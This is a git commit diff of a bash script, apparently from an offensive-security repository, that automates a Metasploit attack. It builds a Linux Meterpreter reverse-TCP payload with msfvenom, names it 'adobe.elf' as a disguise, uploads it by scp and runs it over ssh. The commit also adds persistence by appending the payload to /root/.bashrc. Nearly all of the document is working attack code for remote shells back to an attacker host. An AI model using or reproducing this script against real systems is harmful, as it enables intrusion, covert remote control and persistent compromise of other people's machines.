17675ff0a9120544c33ff38322003e3d4d198b3b
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2023-07-04 07:18:32 +0100

    Update upload-ssh-execute.sh

--- linux/metasploit/upload-ssh-execute.sh
+++ linux/metasploit/upload-ssh-execute.sh
@@ -1,33 +1,31 @@
 #!/bin/bash
 
-# Prompt the user for the IP address to be used for reverse connection (LHOST)
+# Prompt the user for LHOST and LPORT
 read -p "Enter LHOST: " LHOST
-# Prompt the user for the port to be used for reverse connection (LPORT)
 read -p "Enter LPORT: " LPORT
 
-# Generate a Meterpreter payload for a reverse TCP connection using msfvenom
-# The payload will connect back to the specified LHOST and LPORT
-# The payload is an ELF binary (to be run on a Linux target) and is saved to the file adobe.elf
+# Generate a Meterpreter reverse TCP payload with msfvenom
+# The payload is configured with the provided LHOST and LPORT
+# The '-f elf' option specifies that the payload should be in the ELF binary format
+# The output is written to a file named 'adobe.elf'
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o adobe.elf
 
-# Prompt the user for the SSH username
+# Prompt the user for SSH username, host, and the upload path
 read -p "Enter SSH username: " user
-# Prompt the user for the SSH server address
 read -p "Enter SSH host: " host
-# Prompt the user for the path on the SSH server where the payload will be uploaded
 read -p "Enter SSH upload path: " path
 
-# Use scp to upload the payload to the specified location on the SSH server
-# The payload is saved with the same name (adobe.elf)
+# Upload the payload to the SSH server
+# The 'scp' command is used to copy the file over SSH
+# The file 'adobe.elf' is copied to the specified path on the host
 scp adobe.elf $user@$host:$path
 
-# Use ssh to log in to the SSH server and execute the payload
-# The -tt option is used to force pseudo-terminal allocation
-# This can be used to execute arbitrary screen-based programs on a remote machine
-# The chmod +x command makes the payload executable
-# The payload is then executed
-# After the payload is executed, a new bash shell is started to keep the SSH session open
-ssh -tt $user@$host "chmod +x $path/adobe.elf; $path/adobe.elf; bash"
+# Add the command to execute the payload to the .bashrc file of the root user
+# This is done by SSHing into the host and running the echo command to append the line to .bashrc
+# The 'chmod +x' command makes the payload executable
+# The SSH connection is left open by running 'bash' at the end
+ssh -tt $user@$host "chmod +x $path/adobe.elf; echo '$path/adobe.elf' >> /root/.bashrc; bash"
 
-# End of script
+# End the script
 exit 0
+
